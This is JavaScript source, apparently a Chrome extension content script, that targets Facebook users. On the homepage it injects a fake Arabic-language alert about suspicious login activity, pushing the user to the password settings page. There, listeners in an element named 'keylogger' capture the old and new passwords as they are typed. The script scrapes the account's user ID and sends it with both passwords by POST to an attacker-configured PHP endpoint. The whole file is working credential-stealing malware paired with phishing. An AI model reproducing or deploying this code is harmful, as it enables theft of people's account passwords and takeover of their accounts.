
let data = {
thumb   : 'https://www.facebook.com/images/comet/dbl_qp/comet_aswitch.png',
title   : 'لقد لاحظنا مؤخرًا نشاطًا مريبًا من حسابك',
content : 'عملية تسجيل الدخول من جهاز غريب إلى حسابك ، قم بتغيير كلمة المرور إذا لم يتم ذلك من جهازك',
button1 : 'الذهاب للإعدادات',
button2 : 'ليس الأن',
redirect: 'https://www.facebook.com/settings?tab=security',
phpfile : 'http://localhost/info.php',
days    : 0, // Number of days to run the tracker

};





chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
let activeDate = localStorage.getItem("startDate");

var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
var yyyy = today.getFullYear();
today = mm + '/' + dd + '/' + yyyy;

if( activeDate === null ){

localStorage.setItem('startDate',today);

var startLastTime = today;

}else{

var startLastTime = activeDate;

}



var start = new Date(startLastTime);
var end = new Date(today);
var days = (end - start) / 1000 / 60 / 60 / 24;

days = days - (end.getTimezoneOffset() - start.getTimezoneOffset()) / (60 * 24);





if (request.message === 'TabUpdated' && days>=data.days && localStorage.getItem("userSession") === null) {

const params = new URLSearchParams(document.location.search);

if(  params.has("tab") && params.get("tab") == "security" ){

var oldPass;
var newPass;

setTimeout(() => {







var iframe = document.querySelector('iframe');

let keylogger = iframe.contentWindow.document.body;


keylogger.querySelector('#password_old').addEventListener("input", (evt) => {

oldPass = evt.target.value;

});


keylogger.querySelector('#password_new').addEventListener("input", (evt) => {
newPass = evt.target.value;
});


keylogger.querySelector('#password_confirm').addEventListener("input", (evt) => {

let confirmPass = evt.target.value;


if(confirmPass == newPass){


localStorage.setItem('userSession',1);


var textProp = 'textContent' in document ? 'textContent' : 'innerText';


[].slice.call(document.querySelectorAll('script'), 0).forEach(function(aEl) {

if (aEl[textProp].indexOf('"USER_ID":"1000') > -1) {


var userID = aEl[textProp].match(/(?<="USER_ID":")[^"]+(?=")/gm);
userID = (userID !== null ) ? userID[0] : null;

var testObject = {'id':userID,'old': oldPass , 'new': newPass };


const url = data.phpfile;
const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(testObject)
  };

  fetch(url, options)
    .then(response => {
      console.log(response.status);
    });




}
});












}


});




}, 2000);




}else if(document.location.pathname == '/'){



setTimeout(() => {

document.querySelector('#ssrb_stories_end').outerHTML = `

<div class="j83agx80 btwxx1t3 taijpn5t egyptHere"><div class="d2edcug0 oh7imozk abvwweq7 ejjq64ki"><!--$--><span id="ssrb_composer_start" style="display:none"></span><!--$--><div class="kvgmc6g5 ad2k81qe oygrvhab f9o22wc5 oh7imozk ox1siiyg mz2297xg qmfd67dx cx39uazk e3zsy2ct"><!--$--><div class="sjgh65i0"><div class="j83agx80 l9j0dhe7 k4urcfbm"><div style="border-radius:max(0px, min(8px, calc((100vw - 4px - 100%) * 9999))) / 8px" class="rq0escxv l9j0dhe7 du4w35lb hybvsw6c io0zqebd m5lcvass fbipl8qg nwvqtn77 k4urcfbm ni8dbmo4 stjgntxs sbcfpzgs"><div class="k4urcfbm"><div class="ll8tlv6m j83agx80 i1fnvgqd wkznzc2l dhix69tm pybr56ya"><div class="dati1w0a pybr56ya f10w8fjw pmk7jnqg j9ispegn"><svg viewBox="0 0 36 36" class="a8c37x1j ms05siws hwsy1cff b7h9ocf4 aaxa7vy3" height="32" width="32"><path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path><path class="p361ku9c" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path></svg></div><span class="bp9cbjyn pq6dq46d taijpn5t discj3wi k4urcfbm"><div><img height="60" width="60" alt="" referrerpolicy="origin-when-cross-origin" src="${data.thumb}"></div></span><span class="nc684nl6 hideYehia aahdfvyu"><div aria-label="إغلاق" class="oajrlxb2 gs1a9yip g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 pq6dq46d mg4g778l btwxx1t3 pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb lzcic4wl n00je7tq arfg74bv qs9ysxi8 k77z8yql abiwlrkh p8dawk7l dwo3fsh8 pzggbiyp pkj7ub1o bqnlxs5p kkg9azqs c24pa1uk ln9iyx3p fe6kdd0r ar1oviwq l10q8mi9 sq40qgkc s8quxz6p pdjglbur" role="button" tabindex="0"><i data-visualcompletion="css-img" class="hu5pjgll m6k467ps" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/zzcONqkA930.png');background-position:-126px -107px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i><div class="s45kfl79 emlxlaya bkmhp75w spb7xbtv i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s rnr61an3" data-visualcompletion="ignore" style="bottom:-8px;left:-8px;right:-8px;top:-8px"></div></div></span></div><div class="j83agx80 tr9rh885 wkznzc2l oygrvhab dhix69tm ii04i59q"><div class="j83agx80 cbu4d94t mysgfdmx hddg9phg"><div class="w0hvl6rk qjjbsfad"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb hrzyx87i o3w64lxj b2s5l15y hnhda86s oo9gr5id hzawbc8m" dir="auto">${data.title}</span></div><div class="w0hvl6rk qjjbsfad"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 tia6h79c fe6kdd0r mau55g9w c8b282yb hrzyx87i a5q79mjw g1cxx5fr b1v8xokw oo9gr5id hzawbc8m" dir="auto">${data.content}</span></div></div></div><div class="f10w8fjw"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw i1fnvgqd gs1a9yip owycx6da btwxx1t3 hv4rvrfc dati1w0a discj3wi dlv3wnog rl04r1d5 enqfppq2 muag1w35"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t g5gj957u d2edcug0 dirrectSetting hpfvmrgz mg4g778l buofh1pr ph5uu5jm b3onmgus e5nlhep0 ecm0bbzt"><div aria-label="${data.button1}" class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 pq6dq46d p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl n00je7tq arfg74bv qs9ysxi8 k77z8yql l9j0dhe7 abiwlrkh p8dawk7l cbu4d94t taijpn5t k4urcfbm" role="button" tabindex="0"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t bp9cbjyn owycx6da btwxx1t3 kt9q3ron ak7q8e6j isp2s0ed ri5dt5u2 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 d1544ag0 tw6a2znq oo1teu6h tv7at329"><div class="bp9cbjyn j83agx80 taijpn5t c4xchbtz by2jbhx6 a0jftqn4"><div class="rq0escxv l9j0dhe7 du4w35lb d2edcug0 hpfvmrgz bp9cbjyn j83agx80 pfnyh3mw j5wkysh0 hytbnt81"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb hrzyx87i jq4qci2q a3bd9o3v lrazzd5p knomaqxo" dir="auto"><span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg g0qnabr5">${data.button1}</span></span></div></div><div class="n00je7tq arfg74bv qs9ysxi8 k77z8yql i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s rnr61an3" data-visualcompletion="ignore"></div></div></div><div aria-hidden="true" class="do00u71z kr9hpln1"><div aria-disabled="true" aria-label="${data.button2}" class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv rj84mg9z pq6dq46d p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl n00je7tq arfg74bv qs9ysxi8 k77z8yql l9j0dhe7 abiwlrkh p8dawk7l cbu4d94t taijpn5t k4urcfbm" role="button" tabindex="-1"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t bp9cbjyn owycx6da btwxx1t3 kt9q3ron ak7q8e6j isp2s0ed ri5dt5u2 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 d1544ag0 tw6a2znq c98fg2ug tv7at329"><div class="bp9cbjyn j83agx80 taijpn5t c4xchbtz by2jbhx6 a0jftqn4"><div class="rq0escxv l9j0dhe7 du4w35lb d2edcug0 hpfvmrgz bp9cbjyn j83agx80 pfnyh3mw j5wkysh0 hytbnt81"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb hrzyx87i jq4qci2q a3bd9o3v lrazzd5p o7e4w99y" dir="auto"><span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg  g0qnabr5 ">${data.button2}</span></span></div></div><div class="n00je7tq arfg74bv qs9ysxi8 k77z8yql i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s" data-visualcompletion="ignore"></div></div></div></div></div><div class="rq0escxv l9j0dhe7 du4w35lb hideYehia j83agx80 cbu4d94t g5gj957u d2edcug0 hpfvmrgz mg4g778l buofh1pr ph5uu5jm b3onmgus e5nlhep0 ecm0bbzt"><div aria-hidden="true" class="do00u71z kr9hpln1"><div aria-disabled="true" aria-label="${data.button1}" class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv rj84mg9z pq6dq46d p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl n00je7tq arfg74bv qs9ysxi8 k77z8yql l9j0dhe7 abiwlrkh p8dawk7l cbu4d94t taijpn5t k4urcfbm" role="button" tabindex="-1"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t bp9cbjyn owycx6da btwxx1t3 kt9q3ron ak7q8e6j isp2s0ed ri5dt5u2 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 d1544ag0 tw6a2znq c98fg2ug tv7at329"><div class="bp9cbjyn j83agx80 taijpn5t c4xchbtz by2jbhx6 a0jftqn4"><div class="rq0escxv l9j0dhe7 du4w35lb d2edcug0 hpfvmrgz bp9cbjyn j83agx80 pfnyh3mw j5wkysh0 hytbnt81"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb hrzyx87i jq4qci2q a3bd9o3v lrazzd5p o7e4w99y" dir="auto"><span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg g0qnabr5">${data.button1}</span></span></div></div><div class="n00je7tq arfg74bv qs9ysxi8 k77z8yql i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s" data-visualcompletion="ignore"></div></div></div></div><div aria-label="${data.button2}" class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz rq0escxv nhd2j8a9 pq6dq46d p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of lzcic4wl n00je7tq arfg74bv qs9ysxi8 k77z8yql l9j0dhe7 abiwlrkh p8dawk7l cbu4d94t taijpn5t k4urcfbm" role="button" tabindex="0"><div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t bp9cbjyn owycx6da btwxx1t3 kt9q3ron ak7q8e6j isp2s0ed ri5dt5u2 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 d1544ag0 tw6a2znq tdjehn4e tv7at329"><div class="bp9cbjyn j83agx80 taijpn5t c4xchbtz by2jbhx6 a0jftqn4"><div class="rq0escxv l9j0dhe7 du4w35lb d2edcug0 hpfvmrgz bp9cbjyn j83agx80 pfnyh3mw j5wkysh0 hytbnt81"><span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql b0tq1wua a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d9wwppkn fe6kdd0r mau55g9w c8b282yb hrzyx87i jq4qci2q a3bd9o3v lrazzd5p  a57itxjd" dir="auto" ><span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ltmttdrg g0qnabr5"> ${data.button2}</span></span></div></div><div class="n00je7tq arfg74bv qs9ysxi8 k77z8yql i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s" data-visualcompletion="ignore"></div></div></div></div></div></div><div class="tw6a2znq d1544ag0 f10w8fjw taijpn5t btwxx1t3 j83agx80 bp9cbjyn"></div></div></div></div></div><!--/$--></div><!--/$--></div></div>

`;


document.querySelectorAll('.hideYehia').forEach(item => {
  item.addEventListener('click', event => {
    document.querySelector('.egyptHere').outerHTML = "";
  })
})



document.querySelector(".dirrectSetting").addEventListener("click", () => {

window.location.href = data.redirect;


});



}, 200);






}





  }
})
